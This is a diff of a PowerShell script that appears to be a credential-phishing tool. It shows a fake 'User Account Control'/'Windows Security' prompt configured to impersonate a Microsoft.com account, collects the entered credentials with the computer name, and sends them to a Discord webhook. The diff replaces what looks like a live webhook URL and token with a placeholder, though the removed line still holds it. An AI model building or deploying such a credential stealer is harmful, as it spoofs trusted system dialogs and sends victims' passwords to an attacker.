@@ -1,9 +1,9 @@
 # Discord webhook configuration
-$discordWebhookUrl = "https://discord.com/api/webhooks/1335234608458891375/4iUykKNybf7HW4j4VMXF6MSa1j6IRVGP3--L9NgDjIz5v_TXu3dl0R22Y7CeiT47PQeZ"
+$discordWebhookUrl = "urwebhook"
 
 # prompt
 $targetUser = $env:username
-$companyEmail = "public.bc.fi"
+$companyEmail = "Microsoft.com"
 $promptCaption = "User Account Control"
 $promptMessage = "Windows Security"
 $maxTries = 1  # maximum number of times to invoke prompt
@@ -63,3 +63,4 @@ $capturedCreds = $env:computername + '[' + ($harvestCredentials -join ',') + ']'
 
 # Send captured data to Discord
 sendToDiscord
+
